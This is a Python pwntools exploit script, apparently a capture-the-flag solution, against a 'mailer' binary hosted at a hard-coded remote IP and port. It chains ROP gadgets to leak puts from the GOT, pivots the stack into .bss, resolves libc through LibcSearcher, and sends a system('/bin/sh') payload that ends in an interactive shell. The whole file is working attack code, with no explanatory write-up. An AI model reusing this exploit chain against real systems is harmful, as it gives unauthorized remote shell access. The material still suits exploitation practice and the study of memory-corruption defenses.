from pwn import *
from LibcSearcher import *
context.binary = './mailer'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc

if args['REMOTE']:
	p = remote('47.106.94.13', 50011)

else:
	p = process('./mailer')

def dbg():
	raw_input()
def cmd(c):
	p.recvuntil('> ')
	p.sendline(str(c))

def add(content):
	cmd(1)
	p.recvuntil('contents: ')
	p.sendline(content)
	print "add a note success"

def delete(idx):
	cmd(2)
	p.recvuntil('ID (0-4): ')
	p.sendline(str(idx))
	print "delete note %d success " % idx

def post(idx, filter):
	cmd(3)
	p.recvuntil('ID (0-4): ')
	p.sendline(str(idx))
	p.recvuntil('> ')
	p.sendline(str(filter))

	print "post note %d success"

def quit():
	cmd(4)



def exp():

	puts_plt = elf.plt['puts']
	puts_got = elf.got['puts']

	gadget1 = 0x08048dab # pop ebp ; ret
	gadget2 = 0x08048da8 # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	gadget3 = 0x08048495 # pop ebx ; ret
	gadget4 = 0x08048daa # pop edi ; pop ebp ; ret
	gadget5 = 0x08048da9 # pop esi ; pop edi ; pop ebp ; ret

	leave_ret = 0x080485f8 #leave; ret
	stdin_bss = 0x0804B060
	buf_bss = 0x0804B500
	readn = 0x80486d9

	rop_1 = 'a'*0xd + p32(puts_plt) + p32(gadget3) + p32(puts_got)			#puts(&puts)
	rop_1 += p32(readn) + p32(gadget4) + p32(buf_bss) + p32(0x100)			#readn(buf_bss. 0x100), ebp=buf_bss
	rop_1 += p32(gadget1) + p32(buf_bss) + p32(leave_ret) + p32(buf_bss)	#privotstack to buf_bss

	add(rop_1)
	add('b'*255)
	add('c'*255)
	add('d'*255)
	add('e'*255)

	#gdb.attach(p, 'b* 0x08048CFA')
	
	post(4, -15)			#setbuf(fd, content4)
	post(1, 0)				#nofilter(content1, size, fd)
	post(0, 0)				

	quit()

	p.recvuntil('service :)\n')
	puts_addr = u32(p.recv(4))

	"""
	libc_base = puts_addr - libc.symbols['puts']
	system_addr = libc_base + libc.symbols['system']
	binsh = libc_base + next(libc.search('/bin/sh\x00'))
	"""

	libc = LibcSearcher('puts', puts_addr)
	libc_base = puts_addr - libc.dump('puts')
	system_addr = libc_base + libc.dump('system')
	binsh = libc_base + libc.dump('str_bin_sh')
	print "system ==> " + hex(system_addr)

	payload = p32(system_addr)*2 + p32(0xdeadbeef) + p32(binsh)
	p.sendline(payload)

	p.interactive()
	p.close()


if __name__ == '__main__':
	exp()




